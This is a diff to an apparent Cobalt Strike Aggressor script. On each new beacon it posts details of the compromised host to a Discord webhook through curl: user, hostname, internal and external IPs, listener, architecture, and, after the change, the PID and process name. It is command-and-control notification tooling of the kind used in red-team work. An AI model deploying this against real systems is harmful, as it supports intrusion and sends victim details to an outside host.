@@ -1,7 +1,8 @@
-# Based on the work of @sec_groundzero which is based on the work of @bluescreenofjeff
+# Based on the work of 
+# @sec_groundzero which is based on the work of @bluescreenofjeff
 
-$discord_webhookURL = 'https://discord.com/api/webhooks/*************';
-$teamserver_hostname = 'CobaltParrot';
+$discord_webhookURL = 'https://discord.com/api/webhooks/*******************************************************';
+$teamserver_hostname = 'CobaltKitty';
 
 on beacon_initial {
         $user = beacon_data($1) ["user"];
@@ -10,7 +11,10 @@ on beacon_initial {
 	$internal = beacon_data($1)["internal"];
 	$external = beacon_data($1)["external"];
 	$listener = beacon_data($1)["listener"];
-        @curl_command = @('curl','-X','POST','-H','Accept: application/json','-H','Content-Type:application/json','--data','{"content": "Initial Beacon ' . $teamserver_hostname . ', '.$1.' -> '. $user.'@'.$computer.'/'.$internal.'/'.$external.'/'.$listener.'/'.$arch.'"}',$discord_webhookURL);
+	$process = beacon_data($1)["process"];
+	$pid = beacon_data($1)["pid"];
+        @curl_command = @('curl','-X','POST','-H','Accept: application/json','-H','Content-Type:application/json','--data','{"content": "Initial Beacon ' . $teamserver_hostname . ', '.$1.' -> '. $user.'@'.$computer.'/'.$internal.'/'.$external.'/'.$listener.'/'.$arch.'/'.$pid.'/'.$process.'"}',$discord_webhookURL);
         exec(@curl_command);
 }
+
 
